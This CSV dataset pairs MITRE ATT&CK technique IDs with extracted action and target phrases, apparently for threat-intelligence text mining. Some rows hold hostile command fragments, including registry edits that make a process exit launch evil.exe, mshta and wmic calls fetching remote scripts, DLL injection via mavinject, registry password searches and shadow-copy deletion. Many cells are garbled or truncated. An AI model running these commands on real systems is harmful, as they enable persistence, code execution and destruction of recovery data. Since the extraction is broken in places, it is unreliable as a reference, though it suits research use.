id,what,where
t1087,use,"""dscl . list"
t1087,acquire information,get globaladdresslist powershell cmdlet
t1087,acquire information,"""dscl . list"
t1087,acquire information,az ad user list
t1087,acquire information,"passwd"""
t1087,acquire information,"net localgroup""""windows\system32\vboxdisp.dll"""""""
t1088,inject process,trusted process
t1088,inject software,trusted process
t1088,use,rundll32 technique
t1089,kill,security software
t1089,kill,logging process
t1089,delete,registry keys
t1090,use,socks
t1090,use,proxy
t1090,use,htran
t1090,use,socks5
t1091,use,autorun feature
t1091,format,media firmware
t1091,format,executable file
t1091,modify,"media firmware """"windows\system32\vboxhook.dll""""/"
t1091,rename,malware file
t1091,format,media
t1091,manipulate,media
t1091,modify,executable file
t1091,manipulate,executable file
t1091,manipulate,media firmware
t1093,use,process hollowing
t1094,mimick,well known protocol
t1094,develop,custom protocol
t1095,use,session layer protocol
t1095,use,internet control message protocol  icmp
t1095,use,standard non application layer protocol
t1096,use,ea
t1096,use,file attribute
t1097,use,credential dumping
t1099,use,masquerading  technique
t1101,modify,hklm\system\currentcontrolset\control\lsa\security packages
t1101,modify,hklm\system\currentcontrolset\control\lsa\osconfig\security packages
t1102,post,dead drop resolver
t1103,modify,hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows
t1103,load,user32.dll
t1103,load,hkey_local_machine\software\wow6432node\microsoft\windows nt\currentversion\windows
t1103,modify,user32.dll
t1103,modify,hkey_local_machine\software\microsoft\windows nt\currentversion\windows
t1103,load,hkey_local_machine\software\microsoft\windows nt\currentversion\windows
t1104,create,multi stage channel
t1104,use,remote access tool
t1105,use,remote desktop protocol
t1105,use,windows admin share
t1105,use,smb
t1105,use,sftp
t1105,use,scp
t1105,use,rsync
t1105,use,ftp
t1106,use,shellexecuteexw   api
t1106,use,createprocessa   api
t1106,use,loadpackagedlibrary   api
t1106,use,shellexecutea   api
t1106,use,loadmodule   api
t1106,use,winexec   api
t1106,use,loadlibraryw   api
t1106,use,shellexecuteexa   api
t1106,use,createprocessinternala   api
t1106,use,createprocessw   api
t1106,use,loadlibraryexw   api
t1106,use,createprocessasusera   api
t1106,use,loadlibraryexa   api
t1106,use,createprocessasuserw   api
t1106,use,loadlibrarya   api
t1106,use,shellexecutew   api
t1106,use,createprocesswithlogonw   api
t1107,use,del
t1107,use,native cmd
t1107,use,secure deletion tools
t1107,use,third party file deletion tool
t1108,vary,command and control protocol
t1108,use,cloud based infrastructure
t1108,use,web shell technique
t1108,use,cloud based application
t1109,compromise,device firmware
t1110,guess,password
t1110,use,password spraying technique
t1110,use,credential dumping technique
t1110,use,commonly used port
t1111,use,keylogger
t1111,use,inserted hardware token
t1112,prepend keyname,null character
t1112,use,built in windows command line utility reg
t1112,use,remote access tool
t1113,use,native command screencapture
t1113,use,xwd
t1113,use,remote access tool
t1114,access,cache files/ .pst / .ost
t1114,search,cache files/ .pst / .ost
t1114,access,outlook storage/webmail application/outlook web access
t1114,search,email forwarding rule
t1114,search,outlook storage/webmail application/outlook web access
t1114,create,email forwarding rule
t1114,create,outlook storage/webmail application/outlook web access
t1114,access,webmail application/outlook web access
t1114,search,webmail application/outlook web access
t1115,use,windows api
t1115,use,pbpaste
t1116,steal,certificate
t1117,using,component object model hijacking
t1117,using,regsvr32.exe
t1117,send,url
t1117,pass,url
t1117,send,uniform resource locator
t1117,use,regsvr32.exe
t1118,use,[system.componentmodel.runinstaller true ]
t1118,use,attributes within the binary
t1119,use,remote file copy
t1119,use,scripting
t1119,use,file and directory discovery
t1121,use,[comunregisterfunction] attribute
t1121,use,[comregisterfunction] attribute
t1122,change,registry key
t1122,replace,registry key
t1123,use/levarage,voice and video call services
t1123,use/levarage,peripheral devices/applications
t1123,use/levarage,conversations/malware/scripts / microphones/webcams
t1124,use,
t1124,use,net time \hostname
t1124,use,'w32tm
t1125,use,webcam
t1125,use,malware
t1125,use,video call service
t1125,use,peripheral device
t1125,use,application
t1125,write audio file,disk
t1125,use,script
t1125,use,integrated camera
t1126,use,delete command
t1126,use,net use \system\share
t1126,use,net utility
t1128,use,windows registry at hklm\software\microsoft\netsh
t1128,use,vpn software
t1128,modify,netsh registry key
t1128,use,netsh helper dll
t1129,use,"dll pathname specification in import directory/dll pathname exported to another dll/dll directory pathname in ntfs junction / symlink program.exe.local /application manifest/<file name=""filename.extension"" loadfrom=""fully qualified or relative pathnam"
t1129,use,windows native api /createprocess  /loadlibrary  /loadlibraryexw  /dwritecreatefactory
t1130,use,security add trusted cert  d  r trustroot  k
t1130,use,malicious certificate as trusted root certificate
t1130,reinstall,certificate
t1130,use,to
t1130,use,malicious
t1130,use,
t1130,use,bin
t1130,use,keychains
t1130,use,usr
t1130,use,cert
t1130,clone,certificate
t1131,place binary reference,registry key
t1131,place binary reference,"hklm\system\currentcontrolset\control\lsa\""authentication packages"""
t1132,use,character encoding system
t1132,use,binary to text
t1132,use,utf 8
t1132,use,ascii
t1132,use,unicode
t1132,use,standard data encoding system
t1132,use,base64
t1132,use,gzip
t1133,use,valid account technique
t1133,obtain,user credential
t1133,use,credential pharming
t1134,use,createprocesswithtokenw
t1134,use,runas command
t1134,use,windows api function
t1134,use,impersonateloggedonuser
t1134,use,setthreadtoken
t1134,create,new logon session
t1134,use,cobalt strike beacon payload
t1134,use,logonuser
t1134,use,duplicatetoken ex
t1134,use,metasploit?s meterpreter payload
t1134,use,token stealing
t1135,use,net share
t1135,use,net utility
t1135,use,net view \remotesystem
t1136,use,net utility
t1136,use,net user command
t1137,modify,globaldotname registry key
t1137,hijack,application's search order
t1139,use,.bash_history file
t1139,use,~/.bash_history file
t1140,use,powershell
t1140,use,scripting
t1140,use,windows copy
t1140,use,certutil
t1140,use,built in functionality of malware
t1141,use,fake installer
t1141,use,fake promt
t1141,use,fake malware removal site
t1141,use,powershell
t1141,use,applescript
t1143,abuse,plist file tag apple.awt.uielement
t1143,abuse,vbscript
t1143,abuse,powershell.exe  windowstyle hidden
t1143,abuse,jscript
t1143,use,plist file tag apple.awt.uielement
t1143,use,vbscript
t1143,abuse,scripting language
t1143,use,powershell.exe  windowstyle hidden
t1144,load app,optical disk
t1144,use,path
t1144,load app,usb flash drive
t1144,use,to
t1144,load app,drive shared over the local network
t1144,use,myapp.app
t1144,use,xattr command xattr
t1144,load app,drive by download
t1145,use,mimikatz's crypto::extract module
t1145,use,brute force technique
t1145,use,invoke sessiongopher
t1145,use,keylogger
t1145,search,key directory
t1145,search,file extension
t1146,use,".bash_history"""
t1146,search,".bash_historyfile"""
t1146,search,"""~"
t1146,use,command unset histfile
t1146,use,""" rm ~"
t1146,search,environment variable histfile
t1146,use,history  c
t1147,create,account technique with a userid under 500
t1147,set,hide500users property value
t1147,enable,hide500users property value
t1147,use,users
t1147,use,sudo dscl .  create
t1147,use,username uniqueid 401
t1148,prepend,space before terminal command
t1148,set,ignoreboth
t1148,set,ignoredups
t1149,modify,lc_main
t1149,modify,lc_thread
t1150,modify,/library/preferences
t1151,rename,file
t1151,change,file extension
t1151,append,space
t1152,use,launchctl command
t1152,use,"""launchctl submit  l"
t1152,use,path
t1152,use,"execute arg arg arg"""
t1152,use,thing
t1152,use,to
t1153,,source /path/to/filename [arguments]
t1153,,. /path/to/filename [arguments]
t1154,use,trap 'command list' signals
t1154,use,trap command
t1155,use,osascript
t1155,use,command line arguments
t1156,insert,shell command
t1157,use,dylib hyjacking
t1158,put,"""."" as the first character in the file or folder name"
t1158,use,attrib.exe
t1158,use,graphical user interface
t1158,use,uf_hidden flag
t1159,use,$home/library/launchagents
t1159,disguise,/library/launchagents
t1159,use,agent name
t1159,disguise,launchd/launchctl
t1159,use,/library/launchagents
t1159,disguise,$home/library/launchagents
t1159,disguise,system/library/launchagents
t1159,use,system/library/launchagents
t1159,disguise,agent name
t1160,use,system/library/launchdaemons
t1160,use,launchd/launchctl
t1160,disguise,/library/launchdaemons
t1160,use,agent name
t1160,use,/library/launchdaemons
t1160,disguise,launchd/launchctl
t1160,disguise,agent name
t1161,remove,lc_code_signature
t1162,use,applescript
t1162,use,scripting language
t1162,use,api method smloginitemsetenabled
t1163,modify,rc.common file
t1164,modify,~/library/preferences/byhost/com.apple.loginwindow.* .plist
t1164,modify,~/library/preferences/com.apple.loginwindow.plist
t1166,use,chmod u+s [file
t1166,use,chmod 4777 [file]
t1168,modify,plist file
t1168,modify,cron.d file
t1168,use,cron tab
t1168,use,cron job
t1168,use,launchd
t1168,use,cron daemon
t1169,modify,sudoers file
t1170,use,
t1170,use,mshta.exe
t1170,use,msta
t1170,use,payload[.]hta
t1170,use,mshta http[:]
t1170,use,webserver
t1170,use,"payload[.]sct"""" """
t1170,use,"vbscript:close execute ""getobject """"script:https[:]"
t1171,respond,udp 137 traffic
t1171,use,network sniffing tool
t1171,use,nbnspoof
t1171,use,traffic monitoring tool
t1171,use,responder
t1171,use,tool
t1171,respond,llmnr
t1171,respond,udp 5355
t1171,use,metasploit
t1171,use,brute force
t1172,use,tls header sni field are not equal to http header
t1172,use,tls and http
t1173,use,embedded file
t1175,use,dcom
t1175,use,com
t1176,use,social engineering
t1176,masquerade,legitimate extension
t1177,add,driver
t1177,use,dll search order hijacking technique
t1177,use,dll side loading technique
t1177,replace,driver
t1178,use,sid history injection technique
t1179,overwrite,first byte of api function
t1179,use,hokking procedure
t1179,inject,program
t1179,modify,process iat
t1179,spawn,system thread
t1179,modify,iat pointers to createwindowex
t1180,modify,hkcu\control panel\desktop\scrnsave.exe
t1180,modify,hkcu\control panel\desktop\screensaverissecure
t1180,modify,hkcu\control panel\desktop\screensavertimeout
t1181,write code,ewm
t1181,write code,extra window memory
t1181,write payload,extra window memory
t1181,place pointer,ewm
t1181,write payload,ewm
t1181,place pointer,extra window memory
t1182,use,hkey_local_machine\system\currentcontrolset\control\session manager
t1182,use,application programming interface  api  functions /createprocess/createprocessasuser/ createprocesswithloginw/createprocesswithtokenw/winexec/
t1183,,d c:\temp\evil.exe causing a malicious executable to be loaded and run
t1183,,v globalflag
t1183,,d 1reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe
t1183,,v reportingmode
t1183,,d 512reg add hklm\software\microsoft\windows nt\currentversion\silentprocessexit\notepad.exe
t1183,,reg add hklm\software\microsoft\windows nt\currentversion\image file execution options\notepad.exe
t1183,,t reg_dword
t1183,,v monitorprocess
t1184,compromise,ssh agent
t1184,use,agent socket
t1185,use,security vulnerability
t1185,use,browser functionality
t1185,set,http proxy
t1186,use,legitimate executable
t1186,use,process doppelganging
t1186,use,txf transaction
t1186,use,windows transactional ntfs
t1187,point,external reference
t1187,use,file[:]
t1187,use,normal.dotm
t1187,force,smb authentication
t1187,use,
t1187,use,spearphishing
t1187,use,[remote address]
t1188,use,tor
t1188,use,several proxy
t1189,use,built in web application interface
t1189,use,cross site scripting
t1189,use,javascript
t1190,use,command
t1190,use,software
t1190,use,ssh
t1190,use,databases
t1190,use,web servers
t1190,use,standard services
t1190,use,data
t1190,use,smb
t1190,use,sql
t1191,infect inf file,malicious command
t1192,attach,link with social engineering text
t1193,use,executable
t1193,use,microsoft office document
t1193,use,archived file
t1193,use,pdf
t1194,ask about,policy/ software
t1194,leverage,non enterprise controlled service
t1194,leverage,socail media
t1194,leverage,personal webmail
t1194,ask about,job opportunity/service
t1194,leverage,user execution
t1195,,code
t1195,,image
t1195,use,open source code
t1195,,selling s
t1196,use,programmatically
t1196,use,application programming interface  api  call
t1197,invoke,"program when a job complete or error """"hklm\hardware\description\system\""""systembiosversion"""""""
t1197,create,long standing job
t1198,modify,hklm\software[wow6432node]microsoft\cryptography\oid\encodingtype 0\cryptsipdllverifyindirectdata{{sip_guid}} to the dll providing a sip?s cryptsipdllverifyindirectdata function
t1198,modify,hklm\software[wow6432node]microsoft\cryptography\providers\trust\finalpolicy{{trust provider guid}} the dll providing a trust provider?s finalpolicy function
t1198,modify,funcname registry value
t1198,point,malicious dll
t1198,modify,dll  registry value
t1199,use,trusted third party relationship
t1201,use,cat /etc/pam.d/common password
t1201,use,net accounts /domain
t1201,use,net accounts
t1201,use,pwpolicy getaccountpolicies
t1202,use,run window
t1202,use,forfiles
t1202,use,components of the windows subsystem for linux  wsl
t1202,use,the program compatibility assistant  pcalua.exe
t1202,use,scripts
t1203,use,spearphishing via service  technique
t1203,use,spearphishing attachment technique
t1203,use,spearphishing link technique
t1203,use,drive by compromise technique
t1204,deliver,spearphishing link technique
t1204,deliver,spearphishing attachment technique
t1204,use,spearphishing attachment technique
t1204,use,spearphishing link technique
t1205,use,libcap libraries
t1206,disable,tty_tickets
t1207,create,new server and ntdsdsa object
t1207,delete,associated metadata
t1207,manipulate,ad object
t1207,register,rouge dc
t1207,manipulate,account
t1207,manipulate,schema
t1207,alter,associated metadata
t1207,alter,replication
t1207,manipulate,access control list
t1207,delete,replication
t1208,perform,valid account technique
t1208,perform,brute force technique
t1209,use,time provider registry key
t1209,use,hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\
t1210,take advantage,error
t1211,reconnaissance,vulnerability
t1211,reconnaissance,security software discovery technique
t1214,use,"reg query hklm /f password /t reg_sz /s,reg query hkcu /f password /t reg_sz /s"
t1214,use,reg utility
t1216,,hi.png
t1216,,cscript c[:]\windows\system32\printing_admin_scripts\en us\pubprn[.]vbs 127.0.0.1 script:http[:]
t1216,,192.168.1.100
t1218,,regsvr option
t1218,,odbcconf.exe /s /a {regsvr c:\users\public\file.dll}
t1218,,c:\program files\common files\microsoft shared\clicktorun\mavinject32.exe <pid> /injectrunning <path dll>
t1218,,msiexec.exe /y c:\path\to\file.dll
t1218,,msiexec.exe /q /i c:\path\to\file.msi
t1218,,c:\windows\system32\mavinject.exe <pid> /injectrunning <path dll>
t1219,use,logmein
t1219,use,remote access software
t1219,use,desktop support software
t1219,use,remote access tool
t1219,use,ammyyadmin
t1219,use,go2assit
t1219,use,team viewer
t1220,use,msxsl.exe script[.]jpeg script[.]jpeg
t1220,use,wmic process list /format:evil[.]xsl
t1220,use,"wmic os get /format:""https[:]//example[.]com/evil[.]xsl"""
t1220,use,msxsl.exe customers[.]xml script[.]xsl
t1220,use,msxsl.exe script[.]xsl script[.]xsl
t1221,using,template injection
t1222,change,specific access right
t1223,use,user execution technique
t1223,deliver,custom chm file containing embedded payload
t1480,use,environment specific value
t1480,use,physical device
t1480,use,joined active directory  ad  domains
t1480,use,target specific value
t1480,use,""" local"
t1480,use,"software version"""
t1480,use,network share names
t1480,use,""" software"
t1480,use,"external ip addresse"""
t1480,use,attached physical devices
t1481,post,dead drop resolver
t1482,use,.net methods
t1482,use,dsenumeratedomaintrusts   win32 api call
t1482,use,ldap
t1483,concatenate,words together
t1484,modify,"""<gpo_path>\machine\preferences\scheduledtasks\scheduledtasks.xml"""
t1484,use,new gpoimmediatetask script
t1484,use,seenabledelegationprivilege
t1484,set,<gpo_path>\machine\microsoft\windows nt\secedit\gpttmpl.inf
t1485,use,command line argument
t1485,use,del
t1487,overwrite,critical data
t1488,use,third part tool
t1488,use,rawdisk
t1489,,
t1490,use,"quiet"""
t1490,use,"""bcdedit.exe"
t1490,use,all
t1490,use,bcdedit.exe
t1490,use,wbadmin.exe
t1490,use,"set {{default}} recoveryenabled no"""
t1490,use,wmi
t1490,use,vssadmin.exe
t1490,use,"""wmic shadowcopy delete"""
t1490,use,native windows utility
